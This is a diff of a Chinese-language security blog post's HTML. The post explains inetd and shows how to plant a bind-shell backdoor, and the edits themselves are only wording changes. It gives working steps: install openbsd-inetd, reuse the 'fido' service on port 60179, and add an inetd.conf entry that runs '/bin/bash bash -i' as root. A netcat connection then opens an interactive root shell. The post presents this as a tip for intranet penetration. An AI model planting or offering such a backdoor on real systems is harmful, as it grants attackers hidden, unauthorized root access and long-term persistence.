@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="基于 inetd 的后门简要分析及利用"/>
+        <meta property="og:title" content="基于 inetd 后门的简要分析及利用"/>
     
 
     <!--Open Graph Description-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>基于 inetd 的后门简要分析及利用 - klion&#39;s blog</title>
+    <title>基于 inetd 后门的简要分析及利用 - klion&#39;s blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -137,7 +137,7 @@
     <div class="post-header">
         <h1 class="title">
             <a href="/2017/10/23/inetd-backdoor/">
-                基于 inetd 的后门简要分析及利用
+                基于 inetd 后门的简要分析及利用
             </a>
         </h1>
         <div class="post-info">
@@ -159,7 +159,7 @@
         
 
         <!-- Post Content -->
-        <p><br><br>0x01 理解<code>inetd</code>是干什么的<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">通俗来讲就是一个监听外部网络请求[就是一个socket]的系统守护进程,其实有很多比较古老的服务都是基于此守护进程的</div><div class="line">具体怎么工作的呢,也就是说,当inetd接收到一个外部请求后,它会根据这个请求到自己的配置文件中去找到实际处理它的程序</div><div class="line">然后再把接收到的这个socket交给那个程序去处理,问题也恰巧就出在这里</div><div class="line">如果来自外部的某个socket是要执行一个可交互的<span class="keyword">shell</span><span class="bash">[比如,我们已经在目标系统的inetd配置文件中事先定义好],这岂不是就相当于一个简易的<span class="built_in">bind</span>后门</span></div><div class="line">另外,关于使用inet的好处就是,不用每个服务都再单独起个进程,这样可以有效降低系统资源消耗,你甚至也可以一定程度上把它理解成linux中的<span class="string">'svchost.exe'</span>进程</div></pre></td></tr></table></figure></p>
+        <p><br><br>0x01 理解<code>inetd</code>是干什么的<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">通俗来讲就是一个监听外部网络请求 [就是一个socket] 的系统守护进程,其实有很多比较古老的服务都是基于此守护进程的</div><div class="line">具体怎么工作的呢,其实非常简单,当inetd接收到一个外部请求后,它会根据这个请求到自己的配置文件中去找到实际处理它的程序</div><div class="line">然后再把接收到的这个socket交给那个程序去处理,问题恰巧也就出在这里</div><div class="line">如果来自外部的某个socket是要执行一个可交互的<span class="keyword">shell</span><span class="bash"> [比如,我们已经在目标系统的inetd配置文件中事先定义好],这岂不是就相当于一个简易的<span class="built_in">bind</span>型后门</span></div><div class="line">另外,关于使用inet的好处就是,不用每个服务都再单独起个进程,这样可以有效降低系统资源消耗,你甚至也可以一定程度上把它理解成linux中的<span class="string">'svchost.exe'</span>进程</div></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p>0x02 关于inetd.conf配置的具体使用说明<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="name">service_name</span>] [<span class="name">sock_type</span>] [<span class="name">proto</span>] [<span class="name">flags</span>] [<span class="name">user</span>] [<span class="name">server_path</span>] [<span class="name">args</span>]</div><div class="line">[<span class="name">服务名称</span>] [<span class="name">协议</span>(<span class="name">tcp或udp</span>)] [<span class="name">标志</span>(<span class="name">wait或</span> nowait)] [<span class="name">属主</span>] [<span class="name">真实服务程序全路径</span>] [<span class="name">真实服务程序名称及参数</span>]</div></pre></td></tr></table></figure></p>
 <p>我们不妨先来仔细理解下下面语句的意思:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ftp stream tcp nowait root /usr/sbin/<span class="keyword">in</span><span class="selector-class">.ftpd</span> <span class="keyword">in</span>.ftpd</div></pre></td></tr></table></figure></p>
@@ -168,7 +168,8 @@
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">tcp:</span> 使用tcp协议</div></pre></td></tr></table></figure>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root /usr/sbin/<span class="keyword">in</span><span class="selector-class">.ftpd</span> <span class="keyword">in</span><span class="selector-class">.ftpd</span>:</div><div class="line">当inetd监听到ftp客户端请求,且端口成功连接后,inetd就会fork一个子进程,该子进程属主为root</div><div class="line">同时它也继承了该子进程的父进程与客户端连接成功后所产生的子socket</div><div class="line">然后该子进程将该子socket为<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>[标准输入,输出及错误输出]发给execl去执行/usr/sbin/<span class="keyword">in</span><span class="selector-class">.ftpd</span> <span class="keyword">in</span>.ftpd程序</div><div class="line">另外,这里还需要稍微注意下,定义要执行的程序必须给绝对路径</div></pre></td></tr></table></figure>
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">nowait:</span> 父进程不会等待子进程的退出状态</div></pre></td></tr></table></figure>
-<p>0x03 开始插入inetd后门,此处暂以ubuntu 16.04LTS为例进行演示<br>安装inetd<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> apt-get install openbsd-inetd</span></div></pre></td></tr></table></figure></p>
+<p>0x03 开始插入inetd后门,此处暂以ubuntu 16.04LTS为例进行演示</p>
+<p>因为默认没装,我们需要先装下inetd<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> apt-get install openbsd-inetd</span></div></pre></td></tr></table></figure></p>
 <p>为了更好的隐藏我们的shell,可以直接用service中定义好的服务,只需要把实际的处理程序替换下即可<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/services</span></div><div class="line"><span class="attribute">fido</span>   <span class="number">60179</span>/tcp    <span class="comment"># fidonet EMSI over TCP</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/server_inetd_nc_shell.png" alt=""></p>
 <p>配置inetd.conf并启动inetd<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># vi /etc/inetd.conf	</div><div class="line"><span class="symbol">fido</span>  <span class="keyword">stream </span>tcp nowait  root  /<span class="keyword">bin/bash </span><span class="keyword">bash </span>-i # 当外部请求名为fido的服务时就弹个交互式shell给他</div></pre></td></tr></table></figure></p>
@@ -176,7 +177,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> inetd</span></div><div class="line"><span class="meta">#</span><span class="bash"> ps -le | grep inetd</span></div></pre></td></tr></table></figure>
 <p>0x04 实际的连接效果如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nc -vv <span class="number">192.168</span><span class="number">.3</span><span class="number">.28</span> <span class="number">60179</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/server_inetd_nc_connect.png" alt=""></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;也不是什么特别新鲜的东西,年代跟差不多跟suid后门一样久远,使用上也非常简单,不过背后所涉及到的知识还需要大家多花点儿时间去透彻理解下,相信这样你会收获的更多,作为个小tip,在实际渗透内网时,可能会用的上,还是那句话,像这类的bind上去的后门有个通病,只要目标系统防火墙一开基本就全废了</p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;也并不是什么特别新鲜的东西,年代跟差不多跟suid后门一样久远,使用也非常简单,不过背后所涉及到的知识还需要大家多花点儿时间去透彻理解下,相信这样你会收获的更多,作为个小tip,在实际渗透内网时,可能会用的上,还是那句话,像这类的bind上去的后门有个通病,只要目标系统防火墙一开基本就全废了</p>
 
     </div>
 
